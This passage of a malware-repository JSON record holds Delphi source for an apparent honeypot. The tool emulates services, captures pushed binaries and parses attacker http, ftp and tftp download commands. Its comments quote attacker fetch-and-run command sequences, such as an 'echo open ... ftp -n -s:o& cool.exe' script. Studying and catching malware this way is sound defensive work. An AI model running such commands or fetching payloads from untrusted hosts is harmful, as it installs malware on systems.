StrToInt(GetParam('transferport', Data));\n\n  dName         := GetParam('name', Data);\n  dVer          := GetParam('ver', Data);\n\n  If (dRespond) Then\n  Begin\n    dRespCount := StrToInt(GetParam('resp-count', Data));\n    C := 0;\n    For I := 1 To dRespCount Do\n    Begin\n      Temp := Copy(Data, Pos('ifd'+IntToStr(I), LowerCase(Data)), Length(Data));\n      Temp := Copy(Temp, Pos('\"', Temp), Length(Temp));\n      If (Pos(#13, Temp) > 0) Then\n        Temp := Copy(Temp, 1, Pos(#13, Temp)-1);\n      If (Temp <> '') Then\n      Begin\n        Resp := GetResponse(Temp);\n        If (Resp.dGet <> '') Then\n        Begin\n          Response[C] := Resp;\n          Inc(C);\n        End;\n      End;\n    End;\n  End;\n\n  If (dPort > 0) Then\n  Begin\n    INC(SCRIPT_LOADED);\n    StartServer(dPort);\n  End Else\n    INC(SCRIPT_FAILED);\nEnd;\n\nProcedure RunScript(P: Pointer); STDCALL;\nVar\n  Script:TScript;\n  Name  :String;\nBegin\n  Name := PInfo(P)^.dScript;\n  Script := TScript.Create;\n  Script.dScript := Name;\n  GoOn := True;\n  Script.Start;\nEnd;\n\nProcedure LoadScript(dName: String);\nVar\n  Thread:DWord;\nBegin\n  GoOn := False;\n  Info.dScript := dName;\n  CreateThread(NIL, 0, @RunScript, @Info, 0, Thread);\n  Repeat\n    Sleep(1);\n  Until GoOn;\nEnd;\n\nProcedure TScript.ReadFileStr(Name: String; Var Output: String);\nVar\n  cFile :File Of Char;\n  Buf   :Array [1..1024] Of Char;\n  Len   :LongInt;\n  Size  :LongInt;\nBegin\n  Try\n    Output := '';\n\n    AssignFile(cFile, Name);\n    Reset(cFile);\n    Size := FileSize(cFile);\n    While Not (Eof(cFile)) Do\n    Begin\n      BlockRead(cFile, Buf, 1024, Len);\n      Output := Output + String(Buf);\n    End;\n    CloseFile(cFile);\n\n    If Length(Output) > Size Then\n      Output := Copy(Output, 1, Size);\n  Except\n    ;\n  End;\nEnd;\n\nend."
    },
    "filename": "VirusShare_1ef7ed31b6a23468d326357bdc3a7367",
    "filesize": 29244,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "1ef7ed31b6a23468d326357bdc3a7367",
        "sha1": "bc4bc2b0392a4e6ce9d92a19d6788a6b655fa78e",
        "sha256": "1f972e04bbce2dbd98d47c22cec8c0ce405c388f6c82a149430949020ff1b4c2"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "unit untScript;",
            "interface",
            "uses",
            "  Windows, Sysutils, Winsock, MD5, Messages,",
            "  untHTTPDownload, untFTPDownload, untAlert;",
            "type",
            "  TInfo = Record",
            "    dScript: String;",
            "  End;",
            "  PInfo = ^TInfo;",
            "  TResp = Record",
            "    dGet: String;",
            "    dResp: String;",
            "    dFirst: Bool;",
            "  End;",
            "  TScript = Class(TObject)",
            "  Private",
            "    dRespond    :Bool;",
            "    dBBTrans    :Bool;",
            "    dRespCount  :Integer;",
            "    dPort       :Integer;",
            "    dTransfer   :Integer;",
            "    dName       :String;",
            "    dVer        :String;",
            "    dCount      :Integer;",
            "    sData       :Integer;",
            "    rData       :Integer;",
            "    Response    :Array[0..100] Of TResp;",
            "    Procedure ReadFileStr(Name: String; Var Output: String);",
            "    Function  GetParam(dName, dText: String): String;",
            "    Function  GetResponse(dText: String): TResp;",
            "    Procedure StartServer(Int: Integer);",
            "    Procedure ReceiveFile(Int: Integer);",
            "  Public",
            "    dScript     :String;",
            "    Procedure Start;",
            "  End;",
            "  Var",
            "    Info  :TInfo;",
            "    GoOn  :Bool;",
            "    gSock :TSocket;",
            "  Procedure LoadScript(dName: String);",
            "  Procedure RunScript(P: Pointer); STDCALL;",
            "  Function rIP(Sock: TSocket): String;",
            "implementation",
            "Uses",
            "  untMainForm;",
            "Function rIP(Sock: TSocket): String;",
            "  S     :TSockAddrIn;",
            "  I     :Integer;",
            "  W     :TWSAData;",
            "Begin",
            "  WSAStartUP($0101, W);",
            "  I := SizeOf(S);",
            "  GetPeerName(Sock, S, I);",
            "  Result := INET_NTOA(S.SIN_ADDR) +':'+ IntToStr(nTohs(S.sin_port));",
            "  WSACLEANUP;",
            "End;",
            "Function GrabIncome(Sock: TSocket): Bool;",
            "  dTimeOut      :TIMEVAL;",
            "  dStruct       :TFDSET;",
            "Begin",
            "  dTimeOut.tv_sec := 30;",
            "  dTimeOut.tv_usec := 0;",
            "  FD_ZERO(dStruct);",
            "  FD_SET(Sock, dStruct);",
            "  If (Select(0, @dStruct, nil, nil, @dTimeout) <= 0) Then",
            "  Begin",
            "    Result := False;",
            "    Exit;",
            "  End;",
            "  Result := True;",
            "End;",
            "Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);",
            "  xPos: Integer;",
            "Begin",
            "  While Pos(ReplaceWord, Text)>0 Do",
            "  Begin",
            "    xPos := Pos(ReplaceWord, Text);",
            "    Delete(Text, xPos, Length(ReplaceWord));",
            "    Insert(WithWord, Text, xPos);",
            "  End;",
            "End;",
            "Procedure TScript.ReceiveFile(Int: Integer);",
            "  WSA           :TWSAData;",
            "  Sock          :TSocket;",
            "  eSock         :TSocket;",
            "  SockAddr      :TSockAddr;",
            "  SockAddrIn    :TSockAddrIn;",
            "  Buffer        :Array[0..1024] Of Char;",
            "  dErr          :Integer;",
            "  AddrLen       :Integer;",
            "  F             :FILE;",
            "  Data          :String;",
            "  MalwareName   :String;",
            "  Start         :Integer;",
            "  Total         :Integer;",
            "  Speed         :Integer;",
            "Begin",
            "    MalwareName := '[' + dName + '.' + dVer + ']-';",
            "    if (Form1.CheckBox4.Checked) Then MalwareName := MalwareName + TimeToStr(Now) + '_' + DateToStr(Now) + '-';",
            "    if (Form1.ChecKBox5.Checked) Then Malwarename := MalwareName + Copy(rIP(eSock), 1, Pos(':', rIP(eSock))-1)+'-';",
            "    MalwareName := MalwareName + MD5Print(MD5String(TimeToStr(Now)+dName+dVer+DateToStr(Now)));",
            "    if (Form1.CheckBox3.Checked) Then MalwareName := MalwareName + '.bin' Else MalwareName := MalwareName + '.exe';",
            "    ReplaceStr(':', '-', MalwareName);",
            "    ReplaceStr('/', '-', MalwareName);",
            "    MalwareName := MalwarePath + MalwareName;",
            "//  Form1.AddLog('@'+dName+'.'+dVer+': File-transfer starting at port ('+IntToStr(Int)+')');",
            "  Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': File-transfer starting at port ('+IntToStr(Int)+')');",
            "  WSAStartUp($0101, WSA);",
            "  Sock := Socket(AF_INET, SOCK_STREAM, 0);",
            "  If (Sock = INVALID_SOCKET) Then Exit;",
            "  FillChar(SockAddrIn, SizeOf(SockAddrIn), 0);",
            "  SockAddrIn.sin_family := AF_INET;",
            "  SockAddrIn.sin_port := hTons(Int);",
            "  SockAddrIn.sin_addr.S_addr := INADDR_ANY;",
            "  If Bind  (Sock, SockAddrIn, SizeOf(SocKAddrIn)) <> 0 Then Exit;",
            "  If Listen(Sock, SOMAXCONN) <> 0 Then Exit;",
            "  AddrLen := SizeOf(SockAddr);",
            "  While TRUE Do",
            "  Begin",
            "    eSock := Accept(Sock, @SockAddr, @AddrLen);",
            "    If (eSock = INVALID_SOCKET) Then Exit;",
            "    Form1.AddLog('@'+dName+'.'+dVer+': File-transfer started at port ('+IntToStr(Int)+') from ('+rIP(eSock)+')');",
            "    Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': File-transfer started at port ('+IntToStr(Int)+') from ('+rIP(eSock)+')');",
            "    Inc(REMOTE_CONNECTIONS);",
            "    Form1.AddCount(dName, dVer);",
            "    ZeroMemory(@Buffer, SizeOf(Buffer));",
            "    If (dCount > 0) Then",
            "    Begin",
            "      Inc(dCount);",
            "      If (Response[dCount].dFirst) Then",
            "      Begin",
            "        Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0);",
            "        INC(DATA_SENT, Length(Response[dCount].dResp));",
            "        Inc(sData, Length(Response[dCount].dResp));",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "        If (Not GrabIncome(eSock)) Then Exit;",
            "        dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);",
            "        Inc(rData, dErr);",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "      End Else",
            "      Begin",
            "        If (Not GrabIncome(eSock)) Then Exit;",
            "        dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);",
            "        Inc(rData, dErr);",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "        If (Response[dCount].dGet = '*') Then Response[dCount].dGet := String(Buffer);",
            "        If (Response[dCount].dGet = String(Buffer)) Then",
            "        Begin",
            "          Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0);",
            "          INC(DATA_SENT, Length(Response[dCount].dResp));",
            "          Inc(sData, Length(Response[dCount].dResp));",
            "          Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "        End;",
            "      End;",
            "    End;",
            "    Start := GetTickCount;",
            "    Total := 1;",
            "    Form1.AddLog('@'+dName+'.'+dVer+': Creating file ('+MalwareName+')');",
            "    Form1.Memo4.Lines.Add('@'+dName+'.'+dVer+': Creating file ('+MalwareName+')');",
            "    AssignFile(F, MalwareName);",
            "    ReWrite(F, 1);",
            "    Repeat",
            "      If (Not GrabIncome(eSock)) Then Exit;",
            "      dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);",
            "      If dErr <= 0 Then",
            "        Break;",
            "      Inc(rData, dErr);",
            "      Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "      Total := Total + dErr;",
            "      BlockWrite(F, Buffer, dErr);",
            "      INC(DATA_RECEIVED, dErr);",
            "      ZeroMemory(@Buffer, SizeOf(Buffer));",
            "      If (dBBTrans) Then",
            "      Begin",
            "        Data := '*';",
            "        Send(eSock, Data[1], length(Data), 0);",
            "        INC(DATA_SENT, Length(Data));",
            "        Inc(sData, Length(Data));",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "      End;",
            "    Until eSock = INVALID_SOCKET;",
            "    CloseFile(F);",
            "    Speed := Total DIV (((GetTickCount - Start) DIV 1000) + 1);",
            "    If (Speed > RECEIVE_SPEED) Then",
            "      RECEIVE_SPEED := Speed;",
            "      ",
            "    If (Total <= 0) Then",
            "      If (Form1.CheckBox2.Checked) Then",
            "        DeleteFile(pChar(MalwareName));",
            "    If (dCount > 0) Then",
            "    Begin",
            "      Inc(dCount);",
            "      If (Response[dCount].dFirst) Then",
            "      Begin",
            "        Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0);",
            "        Inc(sData, Length(Response[dCount].dResp));",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "        INC(DATA_SENT, Length(Response[dCount].dResp));",
            "        If (Not GrabIncome(eSock)) Then Exit;",
            "        dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);",
            "        Inc(rData, dErr);",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "      End Else",
            "      Begin",
            "        If (Not GrabIncome(eSock)) Then Exit;",
            "        dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);",
            "        Inc(rData, dErr);",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "        If (Response[dCount].dGet = '*') Then Response[dCount].dGet := String(Buffer);",
            "        If (Response[dCount].dGet = String(Buffer)) Then",
            "        Begin",
            "          Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0);",
            "          INC(DATA_SENT, Length(Response[dCount].dResp));",
            "          Inc(sData, Length(Response[dCount].dResp));",
            "          Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "        End;",
            "      End;",
            "    End;",
            "    Form1.AddLog('@'+dName+'.'+dVer+': Received file from ('+rIP(eSock)+')');",
            "    Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': Received file from ('+rIP(eSock)+')');",
            "    CloseSocket(eSock);",
            "  End;",
            "  CloseSocket( Sock);",
            "  WSACleanUP;",
            "End;",
            "Function IsNumeric(Str : String): Bool;",
            "  I: Integer;",
            "  N: String;",
            "Begin",
            "  Result := True;",
            "  N := '0123456789';",
            "  For I := 1 To Length(Str) Do",
            "    If (Pos(Str[I], N) = 0) Then Result := False;",
            "End;",
            "Procedure TScript.StartServer(Int: Integer);",
            "  WSA           :TWSAData;",
            "  eSock         :TSocket;",
            "  Sock          :TSocket;",
            "  SockAddr      :TSockAddr;",
            "  SockAddrIn    :TSockAddrIn;",
            "  Buffer        :Array[0..1024] Of Char;",
            "  wBuffer       :Array[0..1024] Of Char;",
            "  Data          :AnsiString;",
            "  CountDown     :Integer;",
            "  AddrLen       :Integer;",
            "  F             :FILE;",
            "  dErr          :Integer;",
            "  dLen          :Integer;",
            "  U             :Integer;",
            "  I             :Integer;",
            "  FTPUser       :String;",
            "  FTPPort       :String;",
            "  FTPFile       :String;",
            "  FTPName       :String;",
            "  FTPPass       :String;",
            "  MalwareName   :String;",
            "  Start         :Integer;",
            "  Total         :Integer;",
            "  Speed         :Integer;",
            "  AlertThread   :DWord;",
            "Label",
            "  GoBack, HurryTransfer, HurryATransfer, ListenForMore, CloseRemote;",
            "Begin",
            "  Sleep(500);",
            "  Sock := INVALID_SOCKET;",
            "//  Form1.AddLog('@'+dName+'.'+dVer+': Starting server at port ('+IntToStr(Int)+')');",
            "GoBack:",
            "  If (Sock <> INVALID_SOCKET) Then",
            "  Begin",
            "    CloseSocket(Sock);",
            "    WSACleanUP;",
            "  End;",
            "  WSAStartUp($0101, WSA);",
            "  Sock := Socket(AF_INET, SOCK_STREAM, 0);",
            "  If (Sock = INVALID_SOCKET) Then Goto GoBack;",
            "  FillChar(SockAddrIn, SizeOf(SockAddrIn), 0);",
            "  SockAddrIn.sin_family := AF_INET;",
            "  SockAddrIn.sin_port := hTons(Int);",
            "  SockAddrIn.sin_addr.S_addr := INADDR_ANY;",
            "  Form1.SetSocket(1, dName, dVer, INVALID_SOCKET);",
            "  Form1.SetSocket(2, dName, dVer, INVALID_SOCKET);",
            "  If Bind(Sock, SockAddrIn, SizeOf(SockAddrIn)) <> 0 Then Begin INC(SCRIPT_FAILED); Form1.AddErr(dName, dVer); Exit; End;",
            "  If Listen(Sock, SOMAXCONN) <> 0 Then Begin INC(SCRIPT_FAILED); Form1.AddErr(dName, dVer); Goto GoBack; End;",
            "  Form1.SetSocket(1, dName, dVer, Sock);",
            "  Form1.SetSocket(2, dName, dVer, INVALID_SOCKET);",
            "  Form1.AddLog('@'+dName+'.'+dVer+': Server successfully started, waiting for connnections');",
            "  AddrLen := SizeOf(SockAddr);",
            "  While TRUE Do",
            "  Begin",
            "    eSock := Accept(Sock, @SockAddr, @AddrLen);",
            "    If (eSock = INVALID_SOCKET) Then Begin INC(EXPLOIT_FAILURE); Goto GoBack; End;",
            "    rData := 0;",
            "    sData := 0;",
            "    If (Form1.Visible = False) Then",
            "      CreateThread(NIL, 0, @DoAlert, NIL, 0, AlertThread);",
            "    Form1.SetSocket(1, dName, dVer, Sock);",
            "    Form1.SetSocket(2, dName, dVer, eSock);",
            "    // Someone connected.",
            "    Form1.AddLog('@'+dName+'.'+dVer+': Connection established from ('+rIP(eSock)+')');",
            "    Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': Connection established from ('+rIP(eSock)+')');",
            "    Inc(REMOTE_CONNECTIONS);",
            "    Form1.AddVisitor(rIP(eSock), dName+'.'+dVer);",
            "    Form1.AddCount(dName, dVer);",
            "    MalwareName := '[' + dName + '.' + dVer + ']-';",
            "    if (Form1.CheckBox4.Checked) Then MalwareName := MalwareName + TimeToStr(Now) + '_' + DateToStr(Now) + '-';",
            "    if (Form1.ChecKBox5.Checked) Then Malwarename := MalwareName + Copy(rIP(eSock), 1, Pos(':', rIP(eSock))-1)+'-';",
            "    MalwareName := MalwareName + MD5Print(MD5String(TimeToStr(Now)+dName+dVer+DateToStr(Now)));",
            "    if (Form1.CheckBox3.Checked) Then MalwareName := MalwareName + '.bin' Else MalwareName := MalwareName + '.exe';",
            "    ReplaceStr(':', '-', MalwareName);",
            "    ReplaceStr('/', '-', MalwareName);",
            "    MalwareName := MalwarePath + MalwareName;",
            "    // now lets talk with this foo.",
            "    CountDown := dRespCount;",
            "    dCount := 0;",
            "    If (CountDown > 0) Then",
            "    Repeat",
            "      If (Response[dCount].dFirst) Then",
            "      Begin",
            "        If (Response[dCount].dResp = '[transfer]')  And (dPort =  dTransfer) Then Goto HurryTransfer;",
            "        If (Response[dCount].dResp = '[transfer]')  And (dPort <> dTransfer) Then Goto HurryATransfer;",
            "        If (Response[dCount].dResp = '*[transfer]') And (dPort = dTransfer) Then Goto HurryTransfer;",
            "        If (Response[dCount].dResp = '*[transfer]') And (dPort <> dTransfer) Then Goto HurryATransfer;",
            "        If (Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0) < 0) Then Break;",
            "        Inc(sData, Length(Response[dCount].dResp));",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "//        If (Recv(eSock, Buffer, SizeOf(Buffer), 0) < 0) Then Break;",
            "      End Else",
            "      Begin",
            "        If (Not GrabIncome(eSock)) Then Goto ListenForMore;",
            "        dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);",
            "        If (dErr < 0) Then Break;",
            "        Inc(rData, dErr);",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "        If (Response[dCount].dResp = '[transfer]')  And (dPort =  dTransfer) Then Goto HurryTransfer;",
            "        If (Response[dCount].dResp = '[transfer]')  And (dPort <> dTransfer) Then Goto HurryATransfer;",
            "        If (Response[dCount].dResp = '*[transfer]') And (dPort = dTransfer) Then Goto HurryTransfer;",
            "        If (Response[dCount].dResp = '*[transfer]') And (dPort <> dTransfer) Then Goto HurryATransfer;",
            "        If (Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0) < 0) Then Break;",
            "        Inc(sData, Length(Response[dCount].dResp));",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "      End;",
            "      Inc(DATA_SENT, Length(Response[dCount].dResp));",
            "      Inc(DATA_RECEIVED, Length(String(Buffer)));",
            "      If (String(Buffer) <> '') Then",
            "        Form1.AddIncome(rIP(eSock), String(Buffer)); ",
            "        //Form1.Memo1.Lines.Add('['+TimeToStr(Now)+' RECV '+rIP(eSock)+']'+String(Buffer));",
            "      ZeroMemory(@Buffer, SizeOf(Buffer));",
            "        If (Response[dCount].dResp = '[transfer]')  And (dPort =  dTransfer) Then Goto HurryTransfer;",
            "        If (Response[dCount].dResp = '[transfer]')  And (dPort <> dTransfer) Then Goto HurryATransfer;",
            "        If (Response[dCount].dResp = '*[transfer]') And (dPort = dTransfer) Then Goto HurryTransfer;",
            "        If (Response[dCount].dResp = '*[transfer]') And (dPort <> dTransfer) Then Goto HurryATransfer;",
            "      Inc(dCount);",
            "      Dec(CountDown);",
            "      If (CountDown = 0) Then Goto ListenForMore;",
            "    Until CountDown < 0;",
            "    // If you came here, then somethere went wrong",
            "    Goto ListenForMore;",
            "    // HurryTransfer !",
            "HurryTransfer:",
            "    Form1.AddLog('@'+dName+'.'+dVer+': Starting a transfer on same port ('+IntToStr(dPort)+') with ('+rIP(eSock)+')');",
            "    Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': Starting a transfer on same port ('+IntToStr(dPort)+') with ('+rIP(eSock)+')');",
            "    If (dPort = dTransfer) Then",
            "    Begin",
            "      If (Response[dCount].dResp = '*[transfer]') Then",
            "      Begin",
            "        Data := '_';",
            "        Send(eSock, Data[1], Length(Data), 0);",
            "        Inc(sData, Length(Data));",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "        Inc(DATA_SENT, Length(Data));",
            "        Inc(dCount);",
            "      End;",
            "      Start := GetTickCount;",
            "      Total := 1;",
            "      AssignFile(F, MalwareName);",
            "      Rewrite(F, 1);",
            "      dLen := 0;",
            "      U := 0;",
            "      If (dName = 'Mydoom') Then",
            "      Begin",
            "        Repeat",
            "          If (Not GrabIncome(eSock)) Then",
            "          Begin",
            "            CloseFile(F);",
            "            Goto CloseRemote;",
            "          End;",
            "          dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);",
            "          If (Buffer[U] <> 'M') And (dLen = 0) Then",
            "          Begin",
            "            U := 0;",
            "            Repeat Inc(U); Until (Buffer[U] = 'M') Or (U > 20);",
            "            If (U < 20) Then",
            "            Begin",
            "              Move(Buffer[U], wBuffer[0], SizeOf(Buffer)-U);",
            "              If (dErr > 0) Then BlocKWrite(F, wBuffer, dErr);",
            "            End;",
            "            Inc(dLen);",
            "          End Else",
            "            If (dErr > 0) Then BlocKWrite(F, Buffer, dErr);",
            "          FillChar(Buffer, SizeOf(Buffer), 0);",
            "          FillChar(wBuffer, SizeOf(wBuffer), 0);",
            "        Until dErr <= 0;",
            "        dLen := 0;",
            "      End Else",
            "      Begin",
            "        Repeat",
            "          FillChar(Buffer, SizeOf(Buffer), 0);",
            "          If (Not GrabIncome(eSock)) Then",
            "          Begin",
            "            CloseFile(F);",
            "            Goto CloseRemote;",
            "          End;",
            "          dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);",
            "          If (dErr > 0) Then",
            "            BlockWrite(F, Buffer, dErr);",
            "          If (dBBTrans) Then",
            "          Begin",
            "            Data := '*';",
            "            Send(eSock, Data[1], length(Data), 0);",
            "            INC(DATA_SENT, Length(Data));",
            "            Inc(sData, Length(Data));",
            "            Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "          End;",
            "        Until dErr <= 0;",
            "      End;",
            "      Total := FileSize(F);",
            "      CloseFile(F);",
            "      If (Total <= 0) Then",
            "        If (Form1.CheckBox2.Checked) Then",
            "          DeleteFile(pChar(MalwareName));",
            "      Inc(rData, Total);",
            "      Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "      Inc(Data_Received, Total);",
            "      Form1.AddLog('@'+dName+'.'+dVer+': Creating file ('+MalwareName+')');",
            "      Form1.Memo4.Lines.Add('Created '+MalwareName);",
            "      Speed := Total DIV (((GetTickCount - Start) DIV 1000) + 1);",
            "      If (Speed > RECEIVE_SPEED) Then",
            "        RECEIVE_SPEED := Speed;",
            "    End;",
            "    Goto ListenForMore;",
            "HurryATransfer:",
            "    Form1.AddLog('@'+dName+'.'+dVer+': Starting transfer on additional port ('+IntToStr(dTransfer)+') from ('+rIP(eSock)+')');",
            "    If (dTransfer > 0) and (dPort <> dTransfer) Then",
            "    Begin",
            "      If (Response[dCount].dResp = '*[transfer]') Then",
            "      Begin",
            "        Data := '_';",
            "        Send(eSock, Data[1], Length(Data), 0);",
            "        Inc(DATA_SENT, Length(Data));",
            "        Inc(dCount);",
            "        Inc(sData, Length(Data));",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "      End;",
            "      ReceiveFile(dTransfer);",
            "    End;",
            "    Goto ListenForMore;",
            "ListenForMore:",
            "    Form1.AddLog('@'+dName+'.'+dVer+': Waiting for receive data from '+rIP(eSock));",
            "    If (CountDown > 0) Then",
            "    Repeat",
            "      If (Response[dCount].dFirst) Then",
            "      Begin",
            "        If (Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0) < 0) Then Break;",
            "        Inc(sData, Length(Response[dCount].dResp));",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "//        If (Recv(eSock, Buffer, SizeOf(Buffer), 0) < 0) Then Break;",
            "      End Else",
            "      Begin",
            "        If (Not GrabIncome(eSock)) Then Goto CloseRemote;",
            "        dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);",
            "        If (dErr < 0) Then Break;",
            "        Inc(rData, dErr);",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "        If (Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0) < 0) Then Break;",
            "        Inc(sData, Length(Response[dCount].dResp));",
            "        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "      End;",
            "      Inc(DATA_SENT, Length(Response[dCount].dResp));",
            "      Inc(DATA_RECEIVED, Length(String(Buffer)));",
            "      If (String(Buffer) <> '') Then",
            "        Form1.AddIncome(rIP(eSock), String(Buffer));",
            "//        Form1.Memo1.Lines.Add('['+TimeToStr(Now)+' RECV '+rIP(eSock)+']'+String(Buffer));",
            "      ZeroMemory(@Buffer, SizeOf(Buffer));",
            "      Inc(dCount);",
            "      Dec(CountDown);",
            "      If (CountDown < 0) Then Break;",
            "    Until CountDown < 0;",
            "    Repeat",
            "      ZeroMemory(@Buffer, SizeOf(Buffer));",
            "      If (Not GrabIncome(eSock)) Then Goto CloseRemote;",
            "      dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);",
            "      Data := String(Buffer);",
            "      Inc(DATA_RECEIVED, Length(Data));",
            "      Inc(rData, dErr);",
            "      Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);",
            "      If (Data <> '') Then",
            "        Form1.AddIncome(rIP(eSock), Data);",
            "      (* http://domain.com/file.exe *)",
            "      If (LowerCase(Copy(Data, 1, 4)) = 'http') Then",
            "      Begin",
            "        Form1.AddLog('@'+dName+'.'+dVer+': Downloading file from HTTP ('+Data+')');",
            "        DownloadFileFromURL(Data, MalwareName);",
            "        Form1.Memo4.Lines.Add('Created '+ MalwareName);",
            "      End;",
            "      (* ftp://user:pass@domain:port/file.exe *)",
            "      If (LowerCase(Copy(Data, 1, 3)) = 'ftp') Then",
            "      Begin",
            "        Delete(Data, 1, 6);",
            "          FTPUser := Copy(Data, 1, Pos(':', Data)-1);",
            "        Delete(Data, 1, Pos(':', Data));",
            "          FTPPass := Copy(Data, 1, Pos('@', Data)-1);",
            "        Delete(Data, 1, Pos('@', Data));",
            "          FTPName := Copy(Data, 1, Pos(':', Data)-1);",
            "        Delete(Data, 1, Pos(':', Data));",
            "          FTPPort := Copy(Data, 1, Pos('/', Data)-1);",
            "        Delete(Data, 1, Pos('/', Data));",
            "          FTPFile := Data;",
            "        If (pos(' ', FTPFile) > 0) Then Delete(FTPFile, Pos(' ', FTPFile), Length(FTPFile));",
            "        If (pos(#10, FTPFile) > 0) Then Delete(FTPFile, Pos(#10, FTPFile), Length(FTPFile));",
            "        If (pos(#13, FTPFile) > 0) Then Delete(FTPFile, Pos(#13, FTPFile), Length(FTPFile));",
            "        Form1.AddLog('@'+dName+'.'+dVer+': Downloading file from FTP ('+FTPUser+':'+FTPPass+' @ '+FTPName+':'+FTPPort+' : '+FTPFile+')');",
            "        Form1.Memo2.Lines.Add('['+TimeToStr(Now)+' FTP '+rIP(eSock)+']'+",
            "        'Connecting to '+FTPName+':'+FTPPort+'/'+FTPFile+' User:'+FTPUser+' Pass:'+FTPPass);",
            "        DownloadFileFromFTP(FTPUser, FTPPass, FTPName+'/'+FTPFile, MalwareName, StrToInt(FTPPort));",
            "      End;",
            "      (* tftp -i domain file.exe *)",
            "      If (LowerCase(Copy(Data, 1, 4)) = 'tftp') Then",
            "      Begin",
            "        FTPName := Copy(Data, Pos('-i', Data)+3, Length(Data));",
            "        FTPName := Copy(FTPName, 1, Pos(' ', FTPName)-1);",
            "        FTPFile := Copy(Data, Pos('GET', UpperCase(Data)) + 4, Length(Data));",
            "        If (FTPFile[Length(FTPFile)] = #10) then Delete(FTPFile, Length(FTPFile), 1);",
            "        Form1.AddLog('@'+dName+'.'+dVer+': Downloading file from TFTP ('+FTPName+' : '+FTPFile+')');",
            "        Form1.Memo2.Lines.Add('['+TimeToStr(Now)+' FTP '+rIP(eSock)+']Connecting to '+FTPName+':69 > '+FTPFile);",
            "        DownloadFileFromFTP('', '', FTPName+'/'+FTPFile, MalwareName, 69);",
            "      End;",
            "      (* echo open domain port ? echo user ? echo pass ? echo get file.exe ? echo bye ? *)",
            "      If (LowerCase(Copy(Data, 1, 9)) = 'echo open') Then",
            "      Begin",
            "        (*",
            "          echo open 127.0.0.1 1234>>o&",
            "          echo h>>o&",
            "          echo h>>o&",
            "          echo get cool.exe>>o&",
            "          echo bye>>o&",
            "          ftp -n -s:o&",
            "          cool.exe&",
            "          del o&",
            "          exit",
            "        *)",
            "        // the host",
            "        FTPName := Copy(Data, Pos('open', LowerCase(Data))+5, Length(Data));",
            "        FTPName := Copy(FTPName, 1, Pos(' ', FTPName)-1);",
            "        // the port",
            "        FTPPort := Copy(Data, Pos('open', LowerCase(Data))+5, Length(Data));",
            "        FTPPort := Copy(FTPPort, Pos(' ', FTPPort)+1, Length(FTPPort));",
            "        If (Pos(' ', FTPPort) > Pos('>>', FTPPort)) Then",
            "          FTPPort := Copy(FTPPort, 1, Pos('>>', FTPPort)-1)",
            "        Else If (Pos(' ', FTPPort) < Pos('>>', FTPPort)) Then",
            "          FTPPort := Copy(FTPPort, 1, Pos(' ', FTPPort)-1);",
            "        For I := 1 To Length(FTPPort) Do",
            "          If (Not IsNumeric(FTPPort[i])) Then",
            "          Begin",
            "            Delete(FTPPort, I, Length(FTPPort));",
            "            Break;",
            "          End;",
            "        // the file",
            "        FTPFile := Copy(Data, Pos('get', LowerCase(Data))+4, Length(Data));",
            "        FTPFile := Copy(FTPFile, 1, Pos('.', FTPFile)+3);",
            "        // the user",
            "        FTPUser := Copy(Data, Pos('echo', LowerCase(Data))+4, Length(Data));",
